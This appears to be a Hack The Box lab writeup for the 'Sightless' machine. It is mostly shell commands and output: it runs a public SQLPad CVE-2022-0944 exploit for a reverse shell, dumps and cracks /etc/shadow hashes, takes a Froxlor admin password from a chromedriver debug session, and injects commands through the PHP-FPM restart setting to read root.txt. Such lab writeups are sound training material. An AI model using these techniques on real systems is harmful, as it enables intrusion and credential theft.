@@ -1,0 +1,435 @@
+<h2>Scanning</h2>
+<h3>Passive</h3>
+<p>From the ping result we know is a linux machine:</p>
+<pre><code>┌──(oriol㉿zero)-[~/sightless]
+└─$ ping -c1 10.10.11.32
+PING 10.10.11.32 (10.10.11.32) 56(84) bytes of data.
+64 bytes from 10.10.11.32: icmp_seq=1 ttl=63 time=41.1 ms
+
+--- 10.10.11.32 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 41.061/41.061/41.061/0.000 ms
+</code></pre>
+<p>From the traceroute we can see that the target machine is on another network as us (10.10.14.0/23) and we have to go to out gateway to connect to. As always on htb.</p>
+<pre><code>┌──(oriol㉿zero)-[~/sightless]
+└─$ traceroute 10.10.11.32
+traceroute to 10.10.11.32 (10.10.11.32), 30 hops max, 60 byte packets
+ 1  10.10.14.1 (10.10.14.1)  39.641 ms  39.606 ms  39.600 ms
+ 2  10.10.11.32 (10.10.11.32)  40.039 ms  40.036 ms  40.030 ms
+</code></pre>
+<p>I do a wget on the http and https ports</p>
+<pre><code>┌──(oriol㉿zero)-[~]
+└─$ wget https://10.10.11.32           
+--2024-11-21 12:10:12--  https://10.10.11.32/
+Connecting to 10.10.11.32:443... failed: Connection refused.
+
+┌──(oriol㉿zero)-[~]
+└─$ wget http://10.10.11.32 
+--2024-11-21 12:10:17--  http://10.10.11.32/
+Connecting to 10.10.11.32:80... connected.
+HTTP request sent, awaiting response... 302 Moved Temporarily
+Location: http://sightless.htb/ [following]
+--2024-11-21 12:10:17--  http://sightless.htb/
+Resolving sightless.htb (sightless.htb)... failed: Name or service not known.
+wget: unable to resolve host address ‘sightless.htb
+</code></pre>
+<p>It seems that it doesn't have a web on the https. But interestingly, on the http it gets us a 302 code, which is a redirect, to sightless.htb.</p>
+<p>I will add the name to the hosts file and retry the wget.</p>
+<pre><code>10.10.11.32     sightless.htb
+</code></pre>
+<pre><code>┌──(oriol㉿zero)-[~]
+└─$ wget http://sightless.htb
+--2024-11-21 12:14:31--  http://sightless.htb/
+Resolving sightless.htb (sightless.htb)... 10.10.11.32
+Connecting to sightless.htb (sightless.htb)|10.10.11.32|:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 4993 (4.9K) [text/html]
+Saving to: ‘index.html’
+
+index.html                                                 100%[========================================================================================================================================&gt;]   4.88K  --.-KB/s    in 0s      
+
+2024-11-21 12:14:31 (106 MB/s) - ‘index.html’ saved [4993/4993]
+</code></pre>
+<p>Yes, there is a webpage under the sightless.htb name, we got the index.html file. I will enter via browser later, when I'm done with the terminal commands, but at the moment, looking at the index.html seems to be a server administration page.</p>
+<p>It has ssh:</p>
+<pre><code>┌──(oriol㉿zero)-[~]
+└─$ ssh test@sightless.htb
+The authenticity of host 'sightless.htb (10.10.11.32)' can't be established.
+ED25519 key fingerprint is SHA256:L+MjNuOUpEDeXYX6Ucy5RCzbINIjBx2qhJQKjYrExig.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])?
+</code></pre>
+<p>It has ftp, and also we know it uses ProFTPD:</p>
+<pre><code>┌──(oriol㉿zero)-[~/sightless]
+└─$ ftp sightless.htb
+Connected to sightless.htb.
+220 ProFTPD Server (sightless.htb FTP Server) [::ffff:10.10.11.32]
+Name (sightless.htb:oriol):
+</code></pre>
+<p>Let's try and see if it has any msql database we can access now:</p>
+<pre><code>┌──(oriol㉿zero)-[~/sightless]
+└─$ mysql -h sightless.htb
+ERROR 2002 (HY000): Can't connect to server on 'sightless.htb' (115)
+</code></pre>
+<p>Being the kind of web page that it is, it doesn't make sense to search if it has active directory or something else.</p>
+<p>I use what web to see which technologies is using the web:</p>
+<pre><code>┌──(oriol㉿zero)-[~/sightless]
+└─$ whatweb http://sightless.htb   
+http://sightless.htb [200 OK] Country[RESERVED][ZZ], Email[sales@sightless.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.32], Title[Sightless.htb], X-UA-Compatible[IE=edge], nginx[1.18.0]
+</code></pre>
+<p>The os is an Ubuntu and the http server is a <strong>Nginx version 1.18.0</strong></p>
+<p>Let's take a look at the web via the browser:
+![[sightless_01.png]]</p>
+<p>Seems like a pretty simple web, the most interesting thing is the "Our Services" section.
+![[sightless_02.png]]</p>
+<p>SQLPad: SQLPad is a web app that lets users connect to various SQL servers via a browser. Click "Start Now" to try a demo!</p>
+<p>By clicking Start Now, it gets us to the http://sqlpad.sightless.htb/ page. The other "Start Now" buttons redirects us to a external webpage or the "Contact us "section (which is a mailto), but SQLPad not. Let's add the address to the hosts file and retry.</p>
+<pre><code>10.10.11.32     sightless.htb sqlpad.sightless.htb
+</code></pre>
+<p>Interestingly, the page lets us create queries
+![[sightless_03.png]]</p>
+<p>Of course, we have to first add the connection to the database, this means we need the database name and credentials.
+![[sightless_04.png]]</p>
+<p>It's an interesting page to search for exploits and analyze with burpsuite.</p>
+<h3>Active</h3>
+<p>As always, let's use a full nmap scan, that uses scripts, detects versions and on all ports</p>
+<pre><code>┌──(oriol㉿zero)-[~/sightless]
+└─$ nmap -sC -sV -p- -Pn sightless.htb
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-21 13:34 CET
+Nmap scan report for sightless.htb (10.10.11.32)
+Host is up (0.039s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp
+| fingerprint-strings: 
+|   GenericLines: 
+|     220 ProFTPD Server (sightless.htb FTP Server) [::ffff:10.10.11.32]
+|     Invalid command: try being more creative
+|_    Invalid command: try being more creative
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 c9:6e:3b:8f:c6:03:29:05:e5:a0:ca:00:90:c9:5c:52 (ECDSA)
+|_  256 9b:de:3a:27:77:3b:1b:e1:19:5f:16:11:be:70:e0:56 (ED25519)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+|_http-title: Sightless.htb
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port21-TCP:V=7.94SVN%I=7%D=11/21%Time=673F28F2%P=x86_64-pc-linux-gnu%r(
+SF:GenericLines,A0,&quot;220\x20ProFTPD\x20Server\x20\(sightless\.htb\x20FTP\x2
+SF:0Server\)\x20\[::ffff:10\.10\.11\.32\]\r\n500\x20Invalid\x20command:\x2
+SF:0try\x20being\x20more\x20creative\r\n500\x20Invalid\x20command:\x20try\
+SF:x20being\x20more\x20creative\r\n&quot;);
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 89.50 seconds
+</code></pre>
+<p>With this nmap scan, we confirm what we got on the passive scanning phase. We got the OpenSSH version, which is 8.9p1.</p>
+<p>In the Active scanning, I want to get more information on the sqlpad page, so, I will use burpsuite to see if I get some information.</p>
+<p>First of all, I configure the extension "Foxy Proxy" which permits to change proxies fast on the same browser, which is very helpful, this way I don't have to change the system or the browser settings.
+![[sightless_05.png]]</p>
+<p>Firs thing I see on the burpsuite, is that it uses an api to make the whole app:
+![[sightless_06.png]]</p>
+<p>So, I go to the <code>/api/app/</code> directory and see what I get.
+![[sightless_08.png]]
+There seems to be a json with information about the api and the currect user. Most importantly, we get the version of the <strong>sqlpad,</strong> which is <strong>6.10.0</strong></p>
+<p>Recap of the scan phase:
+- Machine is a Ubuntu
+- Has ProFTPD
+- OpenSSH 8.9p1
+- nginx/1.18.0
+- Web on http, seems to be a pretty standard and static web, but a sqlpad page
+- sqlpad where we can connect to databases, version 6.10.0</p>
+<p>By far, the most interesting thing we got is the sqlpad and it's version.</p>
+<h2>Gaining access</h2>
+<p>First of all, let's try if it has anonymous ftp:</p>
+<pre><code>┌──(oriol㉿zero)-[~/sightless]
+└─$ ftp sightless.htb
+Connected to sightless.htb.
+220 ProFTPD Server (sightless.htb FTP Server) [::ffff:10.10.11.32]
+Name (sightless.htb:oriol): anonymous
+550 SSL/TLS required on the control channel
+ftp: Login failed
+ftp&gt; 
+</code></pre>
+<p>No, it doesn't have anonymous ftp.</p>
+<p>Let's go directly to the sqlpad.</p>
+<p>Searching I see the CVE CVE-2022-0944, which can get us to a RCE, this way we can have access to the server via a reverse shell.</p>
+<p>I find this python script that automates the exploit: 
+https://github.com/0xRoqeeb/sqlpad-rce-exploit-CVE-2022-0944</p>
+<p>So, let's try it first and see if it works.</p>
+<pre><code>┌──(oriol㉿zero)-[~/sightless/sqlpad-rce-exploit-CVE-2022-0944]
+└─$ python3 exploit.py http://sqlpad.sightless.htb 10.10.14.102 4444
+Response status code: 400
+Response body: {&quot;title&quot;:&quot;connect ECONNREFUSED 127.0.0.1:3306&quot;}
+Exploit sent, but server responded with status code: 400. Check your listener.
+</code></pre>
+<p>The exploit gives an error (?), but on the netcat we can see that a reverse shell was made:</p>
+<pre><code>┌──(oriol㉿zero)-[~/sightless/sqlpad-rce-exploit-CVE-2022-0944]
+└─$ sudo nc -nvlp 4444                            
+[sudo] password for oriol: 
+listening on [any] 4444 ...
+connect to [10.10.14.102] from (UNKNOWN) [10.10.11.32] 35518
+bash: cannot set terminal process group (1): Inappropriate ioctl for device
+bash: no job control in this shell
+root@c184118df0a6:/var/lib/sqlpad# 
+</code></pre>
+<p>Now that worked, let's see how the exploit works:</p>
+<hr />
+<p>We are root??
+Also there is no user flag?</p>
+<pre><code>root@c184118df0a6:~# ls
+ls
+root@c184118df0a6:~#
+</code></pre>
+<p>I think we are on a docker environment. Let's confirm that by looking for the file .dockerenv on the root folder.</p>
+<pre><code>root@c184118df0a6:/# ls -la
+ls -la
+
+total 88
+drwxr-xr-x   1 root root 4096 Aug  2 09:30 .
+drwxr-xr-x   1 root root 4096 Aug  2 09:30 ..
+-rwxr-xr-x   1 root root    0 Aug  2 09:30 .dockerenv
+</code></pre>
+<p>Yes, we are inside a docker container.</p>
+<p>Let's explore a little and see if we can find something interesting. There is no need to escalate privileges as we are already root.</p>
+<pre><code>root@c184118df0a6:/# cat /etc/passwd
+cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+node:x:1000:1000::/home/node:/bin/bash
+michael:x:1001:1001::/home/michael:/bin/bash
+</code></pre>
+<p>There are 2 interesting users, node and michael. Maybe the application is running under one of this users contexts.</p>
+<p>Let's see the shadow file and try to decrypt the hash, I will try first with michael, as this is a more plausible user to be on the main host. If I get the password maybe I can ssh into it?</p>
+<pre><code>root@c184118df0a6:/# cat /etc/shadow
+cat /etc/shadow
+root:$6$jn8fwk6LVJ9IYw30$qwtrfWTITUro8fEJbReUc7nXyx2wwJsnYdZYm9nMQDHP8SYm33uisO9gZ20LGaepC3ch6Bb2z/lEpBM90Ra4b.:19858:0:99999:7:::
+daemon:*:19051:0:99999:7:::
+bin:*:19051:0:99999:7:::
+sys:*:19051:0:99999:7:::
+sync:*:19051:0:99999:7:::
+games:*:19051:0:99999:7:::
+man:*:19051:0:99999:7:::
+lp:*:19051:0:99999:7:::
+mail:*:19051:0:99999:7:::
+news:*:19051:0:99999:7:::
+uucp:*:19051:0:99999:7:::
+proxy:*:19051:0:99999:7:::
+www-data:*:19051:0:99999:7:::
+backup:*:19051:0:99999:7:::
+list:*:19051:0:99999:7:::
+irc:*:19051:0:99999:7:::
+gnats:*:19051:0:99999:7:::
+nobody:*:19051:0:99999:7:::
+_apt:*:19051:0:99999:7:::
+node:!:19053:0:99999:7:::
+michael:$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/:19860:0:99999:7:::
+</code></pre>
+<p>I usually don't do password brute forcing, as I don't like it, but let's try it.</p>
+<p>First, the most importat thing is get the hash type, on the page https://hashes.com/en/tools/hash_identifier it says it is a <strong>sha512crypt</strong>, we can also know this as it starts with \$6$.</p>
+<p>I add the hash to a file for better working with it</p>
+<pre><code>┌──(oriol㉿zero)-[~/sightless]
+└─$ cat hash  
+$6$mG3Cp2VPGY.FDE8u$KVWVIHzqTzhOSYkzJIpFc2EsgmqvPa.q2Z9bLUU6tlBWaEwuxCDEP9UFHIXNUcF2rBnsaFYuJa6DUh/pL2IJD/
+</code></pre>
+<p>I will use john the ripper with the rockyou wordlist. John automatically detects the hash type, so in this case it's not necessary to specify</p>
+<pre><code>┌──(oriol㉿zero)-[~/sightless]
+└─$ john hash -w=/usr/share/wordlists/rockyou.txt
+Warning: detected hash type &quot;sha512crypt&quot;, but the string is also recognized as &quot;HMAC-SHA256&quot;
+Use the &quot;--format=HMAC-SHA256&quot; option to force loading these as that type instead
+Using default input encoding: UTF-8
+Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
+Cost 1 (iteration count) is 5000 for all loaded hashes
+Will run 8 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+</code></pre>
+<p>Whith just 16 seconds we get the password <strong>insaneclownposse</strong> :</p>
+<pre><code>┌──(oriol㉿zero)-[~/sightless]
+└─$ john hash -w=/usr/share/wordlists/rockyou.txt
+Warning: detected hash type &quot;sha512crypt&quot;, but the string is also recognized as &quot;HMAC-SHA256&quot;
+Use the &quot;--format=HMAC-SHA256&quot; option to force loading these as that type instead
+Using default input encoding: UTF-8
+Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
+Cost 1 (iteration count) is 5000 for all loaded hashes
+Will run 8 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+insaneclownposse (?)     
+1g 0:00:00:16 DONE (2024-11-22 13:36) 0.05885g/s 3495p/s 3495c/s 3495C/s kruimel..062906
+Use the &quot;--show&quot; option to display all of the cracked passwords reliably
+Session completed
+</code></pre>
+<p>So let's try to login via ssh with michael with the password we just got.</p>
+<pre><code>┌──(oriol㉿zero)-[~/sightless]
+└─$ ssh michael@sightless.htb  
+michael@sightless.htb's password: 
+Last login: Fri Nov 22 12:31:16 2024 from 10.10.16.14
+michael@sightless:~$
+</code></pre>
+<p>We are in! This time we can collect the user flag.</p>
+<h2>Privilege escalation</h2>
+<p>The user michael doesn't have sudo privileges:</p>
+<pre><code>michael@sightless:~$ sudo -l
+[sudo] password for michael: 
+Sorry, user michael may not run sudo on sightless.
+</code></pre>
+<p>Listing the files with sUID:</p>
+<pre><code>michael@sightless:~$ find / -perm -u=s -type f 2&gt;/dev/null
+/opt/google/chrome/chrome-sandbox
+/usr/bin/mount
+/usr/bin/chsh
+/usr/bin/sudo
+/usr/bin/su
+/usr/bin/gpasswd
+/usr/bin/fusermount3
+/usr/bin/chfn
+/usr/bin/newgrp
+/usr/bin/passwd
+/usr/bin/umount
+/usr/libexec/polkit-agent-helper-1
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+</code></pre>
+<p>I see the google chrome, which might be interesting, the other files are the default ones and not exploitable.</p>
+<p>Looking at the chrome one I see that is a chrome sandbox, but it seems we can't exploit this https://chromium.googlesource.com/chromium/src/+/0e94f26e8/docs/linux_suid_sandbox.md</p>
+<p>So, the server uses chrome for something, let's search a little bit more about chrome</p>
+<pre><code>michael@sightless:~$ ps aux | grep chrome
+john        1495  0.4  0.3 33630236 15280 ?      Sl   04:03   2:00 /home/john/automation/chromedriver --port=60513
+</code></pre>
+<p>The user john is running <code>chromedriver</code> on port 60513</p>
+<p>Maybe it is a debugging port? We could exploit this, but we need a web to exploit first.
+- https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/chrome-remote-debugger-pentesting/
+- https://devforth.io/blog/chrome-remote-debugging-setup/</p>
+<p>With the <code>netstat</code> command we can see the connections of the server, I see something interesting:</p>
+<pre><code>michael@sightless:~$ netstat -lnp
+(Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.)
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:45455         0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:37497         0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:36823         0.0.0.0:*               LISTEN      -                   
+tcp6       0      0 :::22                   :::*                    LISTEN      -                   
+tcp6       0      0 :::21                   :::*                    LISTEN      -                   
+udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
+udp        0      0 0.0.0.0:68              0.0.0.0:*                           -
+</code></pre>
+<p>There are a bunch of services running on different ports, but most importantlly the one running under the 8080 port, seems to be a web page.</p>
+<p>By doing an <code>wget</code> we can  see if there is a webpage, and if there is one it downloads the index.html file.</p>
+<pre><code>michael@sightless:~$ wget http://localhost:8080
+--2024-11-22 20:03:18--  http://localhost:8080/
+Resolving localhost (localhost)... 127.0.0.1
+Connecting to localhost (localhost)|127.0.0.1|:8080... connected.
+HTTP request sent, awaiting response... 302 Found
+Location: notice.html [following]
+--2024-11-22 20:03:18--  http://localhost:8080/notice.html
+Reusing existing connection to localhost:8080.
+HTTP request sent, awaiting response... 200 OK
+Length: 7320 (7.1K) [text/html]
+Saving to: ‘index.html’
+
+index.html                                                 100%[=======================================================================================================================================&gt;]   7.15K  --.-KB/s    in 0s      
+
+2024-11-22 20:03:18 (508 MB/s) - ‘index.html’ saved [7320/7320]
+</code></pre>
+<p>Yes, there is a web. With the wget output we can see that there is a redirect to the notice.html page. By looking at the contents, we can see it is a "Froxlor" page.</p>
+<pre><code>&lt;h2&gt;Domain not configured&lt;/h2&gt;
+        &lt;p&gt;
+                This domain requires configuration via the froxlor server management panel, as it is currently not assigned to any customer.
+        &lt;/p&gt;
+        &lt;ul&gt;
+</code></pre>
+<p>So, I will use a local ssh tunnel to redirect the port of the machine to my localhost, this way I can access via graphical interface.</p>
+<pre><code>ssh -L 9000:127.0.0.1:8080 michael@sightless.htb
+</code></pre>
+<p>With this, I mapped the port 8080 of the remote server to my local port 9000, I can access to the web via browser now:
+![[sightless_09.png]]</p>
+<p>It seems that we can't access, it says that the domain isn't configured?
+Maybe we need to access through IP?
+![[sightless_10.png]]</p>
+<p>Yes, we got to the froxlor login page. This is good, as we can try to exploit the chrome debugging process. But first, I need to also redirect the remote debugging port to my machine with a ssh tunnel, like I did previously on the port 8080. I will also redirect all ports just in case.</p>
+<pre><code>┌──(oriol㉿zero)-[~]
+└─$ ssh -L 8080:127.0.0.1:8080 -L 60513:127.0.0.1:60513 -L 3306:127.0.0.1:3306 -L 33060:127.0.0.1:33060 -L 32941:127.0.0.1:32941 -L 43965:127.0.0.1:43965  michael@sightless.htb
+michael@sightless.htb's password: 
+Last login: Mon Nov 25 12:04:07 2024 from 10.10.14.41
+michael@sightless:~$
+</code></pre>
+<p>Now, following the instructions of the webs that I found previously regarding the chrome remote debugger, I'll have to add all the ports to the <code>chrome://inspect/#devices</code> page. Obviously on a chrome based browser (I'm using Chromium).
+I select the button "configure" on the network targets section.
+![[sightless_11.png]]</p>
+<p>Once all the ports are configured and added, it will appear the remote target below.
+![[sightless_12.png]]</p>
+<p>As this is a debugging environment, we will possibly get some information on how it works and passwords. I select inspect and I can see the page with the developer options enabled:
+![[sightless_13.png]]</p>
+<p>Interestingly, we can see that it is constantly logging in and out of the page, with the admin account into the log page... Seems we can see the logins of all the users, and for some reason the admin user is logging in constantly, maybe it is an api(?) or the creator of the machine configured it like this so we didn't have to wait?</p>
+<p>Anyway, when the user admin logs in, we can see the credentials on plain text on the "Payload" section of the index.php file:
+![[sightless_14.png]]</p>
+<pre><code>loginname:
+    admin
+password:
+    ForlorfroxAdmin
+</code></pre>
+<p>I try the credentials on the page, and we are in.
+![[sightless_15.png]]</p>
+<p>The first thing I see is the versions of the software:
+- <strong>web server:</strong> Apache/2.4.52
+- <strong>php:</strong> 8.1.2-1ubuntu2.18
+- <strong>MySQL:</strong> 8.0.39-0ubuntu0.22.04.1
+- <strong>Kernel:</strong> 5.15.0-119-generic (x86_64)</p>
+<p>On the upper right corner we can also see the froxlor version, which is <strong>2.1.8</strong>.</p>
+<p>Searching for vulnerabilities of all the software listed, I don't see anything that could help us escalate privileges, as we already have access to the server.</p>
+<p>Taking a look at the page, I stumble upon this:
+![[sightless_16.png]]</p>
+<p>Seems like another user exploited the PHP-FPM versions and could execute commands on the server, seems like it got the root.txt flag.</p>
+<p>I don't like discovering it like this, people should delete the evidences once they are over.</p>
+<p>I create an new PHP version and I see <strong>php-fpm restart command</strong>, which I suppose is the command will be executed on the server.</p>
+<p><strong>What is PHP-FPM and why can we create versions of it?</strong></p>
+<p><strong>PHP-FPM (PHP FastCGI Process Manager)</strong> is an alternative PHP implementation for handling web reqPHP-FPM (PHP FastCGI Process Manager) is an alternative PHP implementation for handling web requests. It is particularly well-suited for high-performance websites. PHP-FPM works as a FastCGI process manager, managing multiple PHP processes to handle requests more efficiently than traditional methods.uests. It is particularly well-suited for high-performance websites. PHP-FPM works as a FastCGI process manager, managing multiple PHP processes to handle requests more efficiently than traditional methods. 
+We can create new versions of it, as Froxlor is a server administration tool, so it makes sense that we can create new instances of php inside the same server, as different applications need different php versions. In essence is like a Docker but only for php.</p>
+<p>Now, what we want is the root.txt flag, that is normally located on the directory <code>/root/</code> so, what we will do, is copy it to the <code>/tmp/xx</code> folder, this way we don't interfere with other users that want to also look at the flag. We could also spawn a reverse shell, but this way is funnier.</p>
+<p>First, I will create a new php version with the command of creating the <code>/tmp/zero</code> folder:</p>
+<p>Reading the froxlor documentation, it seems we have to restart the restart the fpm service to apply the changes:
+https://docs.froxlor.org/latest/admin-guide/php-versions-and-configuration/</p>
+<p>As we don't have permissions to do it via terminal, we'll have to search for this option on the froxlor page.</p>
+<p>I stumble onto this page:
+http://127.0.0.1:8080/admin_settings.php?page=overview&amp;part=phpfpm
+![[sightless_18.png]]</p>
+<p>I disable and enable the php-fpm and is like restarting.</p>
+<p>The zero folder on /tmp/ should be created:</p>
+<pre><code>-bash-5.1$ ls
+bdoor     systemd-private-8fb4cdd2d29e400cb4cccc0a8bf88046-apache2.service-ChJvr1         systemd-private-8fb4cdd2d29e400cb4cccc0a8bf88046-systemd-resolved.service-jswCCo   tmux-1000
+Crashpad  systemd-private-8fb4cdd2d29e400cb4cccc0a8bf88046-ModemManager.service-FHu1dm    systemd-private-8fb4cdd2d29e400cb4cccc0a8bf88046-systemd-timesyncd.service-QEEe8Z  vmware-root_797-4257069498
+root.txt  systemd-private-8fb4cdd2d29e400cb4cccc0a8bf88046-systemd-logind.service-4w9YI6  systemd-private-8fb4cdd2d29e400cb4cccc0a8bf88046-upower.service-q4Y2SZ             zero
+</code></pre>
+<p>There is the root flag on there from another user, but I won't use it. Also for some reason the bash is different? Maybe some other user change it, no problem as we are already done with this machine.</p>
+<p>Now, I edit my already done php version, and on the command I put:</p>
+<pre><code>cp /root/root.txt /tmp/zero
+</code></pre>
+<p>And finally, I repeat with this command, this way the michael user can see the root flag:</p>
+<pre><code>chmod 644 /tmp/zero/root.txt
+</code></pre>
+<p>And finally, we get the flag. To finish, I delete my php version.</p>
